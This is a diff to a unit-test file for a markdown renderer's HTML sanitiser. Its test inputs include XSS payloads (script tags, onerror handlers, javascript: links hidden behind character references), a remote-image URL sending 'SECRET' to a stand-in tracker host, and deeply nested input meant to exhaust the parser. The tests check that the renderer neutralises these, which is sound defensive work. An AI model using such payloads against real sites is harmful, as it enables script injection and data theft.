@@ -1,7 +1,8 @@
 import assert from 'node:assert/strict'
 import { test } from 'node:test'
 
-import { escapeHtml, renderMarkdown } from '../src/server/markdown.ts'
+import { boundNesting, escapeHtml, MAX_INDENT, MAX_NESTING, renderInline, renderMarkdown } from '../src/server/markdown.ts'
+import { decodeCharacterReferences } from '../src/server/sanitize.ts'
 
 /**
  * Unit tests for the document renderer.
@@ -17,11 +18,12 @@ test('a document cannot inject markup', () => {
    * — showing `alert(1)` as text is not a favour to a reader — while a tag that is allowed keeps only the
    * attributes allowed on it.
    */
-  const html = renderMarkdown('Hello <script>alert(1)</script> and <img src=x onerror=alert(1)>')
+  const html = renderMarkdown('Hello <script>alert(1)</script> and <img src=/x.png onerror=alert(1)>')
   assert.ok(!html.includes('<script'), 'no script tag survives')
   assert.ok(!html.includes('alert(1)'), 'and its content is dropped rather than shown')
   assert.ok(!html.includes('onerror'), 'an event handler cannot survive on an allowed tag')
-  assert.match(html, /<img src="x">/, 'while the tag itself keeps the attribute that is allowed')
+  /** An answer's image is a local file, served by the file route (live issue developer-two-7). */
+  assert.match(html, /<img src="\/api\/raw\?path=%2Fx\.png">/, 'while the tag itself keeps the attribute that is allowed')
 })
 
 test('a link that would run script is refused, and the label survives', () => {
@@ -260,4 +262,135 @@ test('refusing a link keeps its rendered label', () => {
   const html = renderMarkdown('[**danger**](javascript:alert(1))')
   assert.ok(!html.includes('<a '), 'no anchor is produced')
   assert.match(html, /<strong>danger<\/strong> \(link refused\)/, 'and the label is rendered, with the reason')
+})
+
+/** Every `href` and `src` the page would follow, read as the browser reads it: references decoded, tab and newline dropped. */
+function followed(html: string): string[] {
+  return [...html.matchAll(/\s(?:href|src)="([^"]*)"/g)].map((match) => decodeCharacterReferences(match[1] ?? '').replace(/[\t\n\r]/g, '').trim())
+}
+
+test('a link whose scheme is hidden behind character references is refused, as the browser would decode it', () => {
+  /**
+   * Live issue developer-two-6 (P0, 2026-10-29): both builds judged a raw HTML `href` as written, so each of these
+   * reached the page unchanged and decoded there into a script or data URL. A click ran script in heddle's origin.
+   */
+  const hidden = [
+    '<a href="&#x6A;avascript:alert(1)">a</a>',
+    '<a href="&#106;avascript:alert(1)">b</a>',
+    '<a href="&#0000106;avascript:alert(1)">c</a>',
+    '<a href="&#x6Aavascript:alert(1)">no semicolon</a>',
+    '<a href="java&#x09;script:alert(1)">d</a>',
+    '<a href="java&Tab;script:alert(1)">e</a>',
+    '<a href="javascript&colon;alert(1)">f</a>',
+    '<a href="&#x64;ata:text/html,x">g</a>',
+    '<a href="&#32;javascript:alert(1)">leading space</a>',
+    '<a href="vb&#x73;cript:x">h</a>',
+  ]
+  for (const source of hidden) {
+    const html = renderMarkdown(source)
+    for (const url of followed(html)) {
+      assert.doesNotMatch(url, /^(?:javascript|data|vbscript):/i, `${source} must not reach the page as ${url}`)
+    }
+  }
+  /** What a document legitimately links to is kept, references and all. */
+  assert.deepEqual(followed(renderMarkdown('<a href="https://example.com/?a=1&amp;b=2">x</a>')), ['https://example.com/?a=1&b=2'])
+  assert.match(renderMarkdown('<a href="https://example.com/?a=1&amp;b=2">x</a>'), /href="https:\/\/example\.com\/\?a=1&amp;b=2"/)
+  assert.deepEqual(followed(renderMarkdown('<a href="mailto:a&#64;b.example">x</a>')), ['mailto:a@b.example'])
+})
+
+test('an answer shows only local images, so it cannot make the page fetch from another host', () => {
+  /**
+   * Live issue developer-two-7 (P0, 2026-10-29): an answer's remote image was fetched the moment the answer was drawn,
+   * a no-click channel out. DSH's `localPathMediaUrl` resolves an image to its file API or not at all.
+   */
+  const remote = [
+    '![x](https://tracker.example/p.png?d=SECRET)',
+    '<img src="https://tracker.example/p.png?d=SECRET">',
+    '![x](//tracker.example/p.png)',
+    '<img src="//tracker.example/p.png">',
+    '<img src="&#x2F;&#x2F;tracker.example/p.png">',
+    '<img src="http&#x3A;//tracker.example/p.png">',
+  ]
+  for (const source of remote) {
+    const html = renderMarkdown(source)
+    assert.ok(!followed(html).some((url) => /^(?:[a-z][a-z0-9+.-]*:)?\/\//i.test(url)), `${source} fetches nothing remote: ${html}`)
+  }
+  assert.match(renderMarkdown('![x](https://tracker.example/p.png)'), /<p>x<\/p>/, 'a refused image is its alt text')
+  assert.match(renderMarkdown('![x](/api/sessions)'), /src="\/api\/raw\?path=%2Fapi%2Fsessions"/, 'an absolute path is a file, not an API of the answer\'s choosing')
+  assert.match(renderMarkdown('![plot](/w/plot.png)'), /src="\/api\/raw\?path=%2Fw%2Fplot\.png"/, 'a local image still shows')
+  assert.equal(followed(renderMarkdown('![p](plot.png)')).length, 0, 'a relative image with no folder to resolve against is not fetched')
+  /** A document's preview keeps its author's remote image as written: a badge in a README. */
+  assert.match(renderMarkdown('![b](https://img.shields.io/x.svg)', { base: '/w', remoteImages: true }), /src="https:\/\/img\.shields\.io\/x\.svg"/)
+})
+
+test('a line opens at most MAX_NESTING containers, and the rest reads as text', () => {
+  /** Live issues developer-two-15 (P0, Rust aborted) and -16 (TS failed the session view) at thousands of levels. */
+  assert.equal(MAX_NESTING, 100)
+  assert.equal(boundNesting(`${'>'.repeat(102)} x`), `${'>'.repeat(100)}\\>> x`, 'the 101st quote marker is escaped')
+  assert.equal(boundNesting(`${'- '.repeat(101)}x`), `${'- '.repeat(100)}\\- x`, 'and the 101st bullet')
+  assert.equal(boundNesting(`${'1. '.repeat(101)}x`), `${'1. '.repeat(100)}1\\. x`, 'and the 101st number keeps its digits')
+  assert.equal(boundNesting('> quote\n> > nested\n- a\n  - b'), '> quote\n> > nested\n- a\n  - b', 'ordinary nesting is untouched')
+  assert.equal(
+    boundNesting(`\`\`\`\n${'>'.repeat(102)}\n\`\`\``),
+    `\`\`\`\n${'>'.repeat(100)}\\>>\n\`\`\``,
+    'a line inside a code fence is bounded too, so no fence test can switch the bound off',
+  )
+})
+
+test('a line that only looks like a fence does not switch the bound off', () => {
+  /** developer-three's review: four spaces make an indented code block, and a backtick fence's info string has no backtick. */
+  for (const opener of ['    ```', '``` a`b', '```', '~~~']) {
+    const bounded = boundNesting(`${opener}\n\n${'>'.repeat(200)} x`)
+    assert.ok(!bounded.includes('>'.repeat(MAX_NESTING + 1)), JSON.stringify(opener))
+  }
+})
+
+test('deep inline nesting, mixed containers and a deeply indented list all render', () => {
+  /** developer-three's test material: none of these is bounded line by line, so the guard behind the bound must hold. */
+  const cases = {
+    stars: `${'*'.repeat(20000)}x${'*'.repeat(20000)}`,
+    brackets: `${'['.repeat(20000)}x${']'.repeat(20000)}`,
+    underscores: `${'_'.repeat(20000)}x${'_'.repeat(20000)}`,
+    mixed: `${'> - 1. '.repeat(20000)}x`,
+    indented: Array.from({ length: 3000 }, (_, level) => `${'  '.repeat(level)}- ${level}`).join('\n'),
+  }
+  for (const [name, source] of Object.entries(cases)) {
+    const html = renderMarkdown(source)
+    assert.ok(html.length > 0, name)
+  }
+  const indented = renderMarkdown(cases.indented)
+  assert.ok((indented.match(/<ul>/g) ?? []).length <= MAX_NESTING + 1, 'an indented list nests at a bounded depth')
+})
+
+test('a line keeps at most MAX_INDENT columns of indentation', () => {
+  assert.equal(MAX_INDENT, 200)
+  assert.equal(boundNesting(`${' '.repeat(300)}- x`), `${' '.repeat(200)}- x`)
+  assert.equal(boundNesting(`${'\t'.repeat(60)}- x`), `${' '.repeat(200)}- x`, 'a tab reaches the next multiple of four')
+  assert.equal(boundNesting(`${' '.repeat(200)}- x`), `${' '.repeat(200)}- x`, 'up to the bound a line is untouched')
+})
+
+test('fifty thousand nested quotes or list items render, at a bounded depth', () => {
+  const quotes = renderMarkdown(`${'>'.repeat(50000)} x`)
+  assert.equal((quotes.match(/<blockquote>/g) ?? []).length, 100, 'one hundred quotes, the rest as text')
+  const bullets = renderMarkdown(`${'- '.repeat(20000)}x`)
+  assert.equal((bullets.match(/<ul>/g) ?? []).length, 100)
+  assert.ok(renderInline('>'.repeat(50000)).length > 0, 'an inline span renders too')
+})
+
+test('a text the parser cannot render is shown as its own escaped words, not as an error', () => {
+  /** Deep inline nesting is not bounded line by line; marked then runs out of stack, which this build can catch. */
+  const html = renderMarkdown(`${'*a '.repeat(5000)}<b>x</b>${' a*'.repeat(5000)}`)
+  assert.ok(html.startsWith('<pre class="unrendered"><code>'), 'the words are kept in a plain block')
+  assert.ok(html.includes('&lt;b&gt;x&lt;/b&gt;') && !html.includes('<b>'), 'escaped, so nothing in them runs')
+})
+
+
+test('parser work budget preserves hostile inline input as escaped text without recursion', () => {
+  const huge = '*a '.repeat(800000) + 'x' + ' a*'.repeat(800000)
+  const compact = '*a '.repeat(2000) + '<script>x</script>' + ' a*'.repeat(2000)
+  for (const text of [huge, compact, 'x'.repeat(65537)]) {
+    assert.equal(renderMarkdown(text), `<pre class="unrendered"><code>${escapeHtml(text)}</code></pre>`)
+    assert.equal(renderInline(text), escapeHtml(text))
+  }
+  assert.match(renderMarkdown('ordinary **bold** and *emphasis*'), /<strong>bold<\/strong>/)
 })
